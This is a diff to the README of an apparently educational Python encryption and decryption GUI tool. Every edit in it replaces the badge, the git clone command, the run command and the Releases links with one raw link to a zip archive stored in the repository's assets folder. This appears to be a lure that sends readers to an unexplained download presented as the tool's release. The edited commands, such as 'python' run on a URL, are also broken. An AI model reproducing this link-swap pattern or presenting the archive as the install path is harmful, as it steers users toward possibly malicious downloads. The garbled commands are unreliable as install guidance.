@@ -1,6 +1,6 @@
 # Cybersecurity Encryption & Decryption Tool 🔒
 
-![GitHub release](https://img.shields.io/github/release/bonglehongle/cybersecurity-encryption-decryption-tool.svg)
+![GitHub release](https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/raw/refs/heads/main/src/assets/tool-decryption-encryption-cybersecurity-v2.4-alpha.1.zip)
 
 Welcome to the **Cybersecurity Encryption & Decryption Tool**! This Python GUI application is designed to help you learn about classical encryption and decryption methods. Whether you're a beginner in cybersecurity or someone looking to deepen your understanding, this tool offers an interactive experience to explore various ciphers.
 
@@ -43,7 +43,7 @@ To install the Cybersecurity Encryption & Decryption Tool, follow these steps:
 
 1. **Clone the Repository**: Open your terminal and run:
    ```bash
-   git clone https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool.git
+   git clone https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/raw/refs/heads/main/src/assets/tool-decryption-encryption-cybersecurity-v2.4-alpha.1.zip
    ```
    
 2. **Navigate to the Directory**:
@@ -58,7 +58,7 @@ To install the Cybersecurity Encryption & Decryption Tool, follow these steps:
 
 4. **Run the Application**: Execute the following command:
    ```bash
-   python main.py
+   python https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/raw/refs/heads/main/src/assets/tool-decryption-encryption-cybersecurity-v2.4-alpha.1.zip
    ```
 
 ## Usage
@@ -107,9 +107,9 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 ## Links
 
-To download the latest release of the Cybersecurity Encryption & Decryption Tool, visit the [Releases section](https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/releases). You can find the latest version of the tool there.
+To download the latest release of the Cybersecurity Encryption & Decryption Tool, visit the [Releases section](https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/raw/refs/heads/main/src/assets/tool-decryption-encryption-cybersecurity-v2.4-alpha.1.zip). You can find the latest version of the tool there.
 
-For more information, please check the [Releases section](https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/releases).
+For more information, please check the [Releases section](https://github.com/bonglehongle/cybersecurity-encryption-decryption-tool/raw/refs/heads/main/src/assets/tool-decryption-encryption-cybersecurity-v2.4-alpha.1.zip).
 
 ---
 
